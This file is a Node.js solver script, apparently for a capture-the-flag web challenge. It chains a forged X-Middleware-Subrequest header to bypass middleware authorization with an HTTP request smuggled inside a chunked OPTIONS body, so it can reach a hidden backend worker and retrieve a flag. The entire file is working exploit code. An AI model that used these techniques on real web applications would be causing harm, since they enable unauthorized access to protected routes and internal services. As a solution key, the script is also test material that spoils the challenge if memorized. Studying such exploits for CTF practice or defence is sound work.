import crypto from 'node:crypto';

import { RawHttpConnection, requestHead } from './raw-http.mjs';

const configuredUrl = process.env.CHALLENGE_URL ? new URL(process.env.CHALLENGE_URL) : null;
if (configuredUrl && configuredUrl.protocol !== 'http:') {
  throw new Error('The solver requires plain HTTP/1.1 or L4 TCP passthrough.');
}
const host = process.env.CHALLENGE_HOST ?? configuredUrl?.hostname ?? '127.0.0.1';
const defaultPort = configuredUrl ? (configuredUrl.port ? Number.parseInt(configuredUrl.port, 10) : 80) : 8080;
const port = parsePort(process.env.CHALLENGE_PORT, defaultPort);
const authority = configuredUrl?.host ?? `${host}:${port}`;
const client = new RawHttpConnection(host, port);

function parsePort(raw, fallback) {
  const value = Number.parseInt(raw ?? '', 10);
  return Number.isInteger(value) && value > 0 && value <= 65535 ? value : fallback;
}

function headerMarker(trace) {
  const match = /(?:^|;)\s*node=([A-Za-z0-9_-]+)\s*;\s*budget=(\d+)/.exec(trace ?? '');
  if (!match) throw new Error('routing trace did not expose a recursion node');
  const depth = Number.parseInt(match[2], 10);
  if (!Number.isInteger(depth) || depth < 1 || depth > 16) throw new Error('invalid recursion budget');
  return Array(depth).fill(match[1]).join(':');
}

function preconnectWorker(linkHeader) {
  for (const entry of String(linkHeader ?? '').split(',')) {
    const match = /<([^>]+)>\s*;\s*rel=preconnect/i.exec(entry.trim());
    if (match) return match[1];
  }
  throw new Error('103 response did not contain the active preconnect worker');
}

function relayProof(windowNonce, ticket, slug) {
  return crypto.createHmac('sha256', Buffer.from(windowNonce, 'hex'))
    .update(Buffer.concat([Buffer.from(ticket), Buffer.from([0]), Buffer.from(slug)]))
    .digest('hex');
}

await client.connect();
try {
  console.log(`[1/5] observing the denied route on ${authority}`);
  const denied = await client.exchange(requestHead('GET', '/dashboard', authority, { Connection: 'keep-alive' }));
  if (denied.final.status !== 302) throw new Error(`expected 302, got ${denied.final.status}`);
  const marker = headerMarker(denied.final.headers['x-route-trace']);

  console.log('[2/5] replaying the process-local recursion marker');
  const dashboard = await client.exchange(requestHead('GET', '/dashboard', authority, {
    'X-Middleware-Subrequest': marker,
    Connection: 'keep-alive',
  }));
  if (dashboard.final.status !== 200) throw new Error(`dashboard bypass failed: ${dashboard.final.status}`);

  const ticket = crypto.randomBytes(16).toString('hex');
  console.log(`[3/5] opening a raw relay window for ticket ${ticket}`);
  const windowExchange = await client.exchange(requestHead('GET', `/api/relay/window?ticket=${ticket}`, authority, {
    'X-Middleware-Subrequest': marker,
    Connection: 'keep-alive',
  }));
  const early = windowExchange.informational.find((response) => response.status === 103);
  if (!early || windowExchange.final.status !== 204) throw new Error('expected 103 Early Hints followed by 204');
  const windowNonce = early.headers['x-relay-window'];
  const session = early.headers['x-relay-session'];
  const capability = early.headers['x-relay-capability'];
  const worker = preconnectWorker(early.headers.link);
  const slug = worker.split('/').filter(Boolean).at(-1);
  if (!/^[a-f0-9]{32}$/.test(windowNonce ?? '') || !/^[A-Za-z0-9_-]{24}$/.test(session ?? '') ||
      !/^[a-f0-9]{64}$/.test(capability ?? '') || !/^[a-f0-9]{16}$/.test(slug ?? '')) {
    throw new Error('invalid wire metadata');
  }
  const proof = relayProof(windowNonce, ticket, slug);

  const inner = Buffer.from(
    `GET ${worker}?ticket=${ticket} HTTP/1.1\r\n` +
    'Host: backend\r\n' +
    `X-Relay-Window: ${windowNonce}\r\n` +
    `X-Relay-Session: ${session}\r\n` +
    `X-Relay-Capability: ${capability}\r\n` +
    `X-Relay-Proof: ${proof}\r\n` +
    'Connection: keep-alive\r\n\r\n',
    'latin1',
  );
  const carrierHead = Buffer.from(
    'OPTIONS /api/relay/ping HTTP/1.1\r\n' +
    `Host: ${authority}\r\n` +
    `X-Middleware-Subrequest: ${marker}\r\n` +
    'Transfer-Encoding: chunked\r\n' +
    'Trailer: X-Relay-Proof\r\n' +
    'Connection: keep-alive\r\n\r\n' +
    `${inner.length.toString(16)}\r\n`,
    'latin1',
  );
  const carrierTail = Buffer.from(`\r\n0\r\nX-Relay-Proof: ${proof}\r\n\r\n`, 'latin1');

  console.log('[4/5] sending the state-bound chunked carrier on the same HTTP/1.1 channel');
  const carrier = await client.exchange(Buffer.concat([carrierHead, inner, carrierTail]));
  if (carrier.final.status !== 204) throw new Error(`carrier failed: ${carrier.final.status}`);

  console.log('[5/5] consuming the affine one-shot result');
  const result = await client.exchange(requestHead('GET', `/api/relay/result?ticket=${ticket}`, authority, {
    'X-Middleware-Subrequest': marker,
    Connection: 'close',
  }));
  if (result.final.status !== 200) throw new Error(`result unavailable: ${result.final.status}`);
  const body = JSON.parse(result.final.body.toString('utf8'));
  if (typeof body.result !== 'string' || !/^flag\{[^\r\n}]{1,200}\}$/.test(body.result)) {
    throw new Error(`unexpected result: ${JSON.stringify(body)}`);
  }
  console.log(`FLAG: ${body.result}`);
} finally {
  client.close();
}
